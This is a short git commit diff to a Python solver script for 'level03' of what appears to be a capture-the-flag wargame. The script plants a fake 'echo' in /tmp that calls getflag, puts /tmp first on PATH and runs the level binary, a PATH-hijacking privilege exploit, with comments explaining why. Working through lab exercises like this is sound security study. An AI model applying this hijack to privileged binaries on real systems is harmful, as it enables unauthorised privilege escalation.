80067102fdca8bc3cca1a5650883bc344665ca48
Timoti Fregni <timotif@gmail.com>
2025-01-26 11:33:51 +0100

    solver level03

--- level03/resources/level03.py
+++ level03/resources/level03.py
@@ -1,7 +1,9 @@
 from solver.utils import extract_flag
 
 def solve(connection):
-	connection.exec("echo 'getflag' > /tmp/echo && export PATH=/tmp:$PATH && chmod 777 /tmp/echo")
-	response = connection.exec("./level03")
+	# The binary calls echo from the env: make my own echo that calls getflag
+	connection.exec("echo 'getflag' > /tmp/echo && chmod 777 /tmp/echo")
+	# Include /tmp in the PATH and run the binary (IMPORTANT: the operations need to be in the same exec call)
+	response = connection.exec("export PATH=/tmp:$PATH && ./level03")
 	flag = extract_flag(response)
 	return "", flag
